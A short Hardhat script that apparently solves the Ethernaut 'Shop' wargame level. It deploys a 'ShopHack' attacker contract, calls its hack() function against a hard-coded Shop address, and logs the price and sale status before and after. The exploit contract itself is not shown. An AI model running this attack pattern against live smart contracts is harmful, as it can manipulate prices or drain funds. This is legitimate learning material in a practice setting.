const { getChainId } = require('hardhat');

async function main() {
  const [hacker] = await ethers.getSigners();

  console.log("Deploying contract with the account:", hacker.address);

  console.log(`Hacker account balance: ${ethers.utils.formatEther(await hacker.getBalance()).toString()}`);

  const ShopHack = await ethers.getContractFactory("ShopHack");
  const shopHack = await ShopHack.deploy();

  console.log("ShopHack deployed to address:", shopHack.address);

  // add set the address of ehternaut Shop
  const ShopAddress = '0x0C5044b3b461f311D21D280348d8A01c1D194a32';

  const Shop = await ethers.getContractAt('Shop', ShopAddress);
  
  console.log(`Shop price: ${await Shop.price()}`);
  console.log(`Shop isSold: ${await Shop.isSold()}`);

  let tx = await shopHack.hack(ShopAddress);
  await tx.wait();

  console.log(`Shop price: ${await Shop.price()}`);
  console.log(`Shop isSold: ${await Shop.isSold()}`);

}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
